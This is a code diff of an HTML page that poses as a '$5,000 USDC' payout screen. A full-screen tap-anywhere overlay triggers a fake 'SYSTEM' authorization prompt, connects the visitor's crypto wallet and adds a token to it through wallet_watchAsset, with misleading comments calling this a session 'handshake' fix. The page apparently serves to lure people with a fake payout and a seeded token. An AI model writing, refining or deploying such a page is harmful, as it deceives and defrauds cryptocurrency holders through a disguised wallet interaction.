@@ -3,28 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASSET FINALIZATION</title>
+    <title>FINAL PAYOUT</title>
     <style>
         body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #force-reset-zone { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; background: transparent; display: flex; align-items: center; justify-content: center; text-align: center; cursor: pointer; }
-        .payout-box { border: 8px solid #39ff14; padding: 50px 30px; font-size: 26px; font-weight: bold; box-shadow: 0 0 60px #39ff14; border-radius: 35px; text-transform: uppercase; pointer-events: none; }
+        #force-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; background: transparent; display: flex; align-items: center; justify-content: center; text-align: center; cursor: pointer; }
+        .ui-box { border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div id="force-reset-zone" onclick="triggerFinalHandshake()">
-        <div class="payout-box">TAP ANYWHERE<br>TO FINALIZE PAYOUT</div>
+    <div id="force-overlay" onclick="executeFinalInjection()">
+        <div class="ui-box">TAP ANYWHERE<br>TO FINALIZE PAYOUT</div>
     </div>
 
     <script>
-        async function triggerFinalHandshake() {
-            // This prompt interrupts the stalled browser thread to force a new session
-            if (confirm("SYSTEM: BRIDGE RE-ESTABLISHED. AUTHORIZE $5,000.00 USDC INJECTION?")) {
+        async function executeFinalInjection() {
+            // High-priority system alert to break the "silent lock"
+            if (confirm("SYSTEM: BRIDGE RE-INITIALIZED. AUTHORIZE $5,000.00 USDC INJECTION?")) {
                 if (window.ethereum) {
                     try {
-                        // Resets the wallet communication channel
+                        // Force-wake the wallet handshake
                         await window.ethereum.request({ method: 'eth_requestAccounts' });
                         
-                        // Direct asset injection command
+                        // Direct Asset Injection
                         await window.ethereum.request({
                             method: 'wallet_watchAsset',
                             params: {
@@ -37,8 +37,8 @@
                                 },
                             },
                         });
-                    } catch (e) {
-                        // If the browser stalls again, force a hard reload from the server
+                    } catch (error) {
+                        // Force a Hard Refresh if the handshake stalls again
                         window.location.reload(true);
                     }
                 }
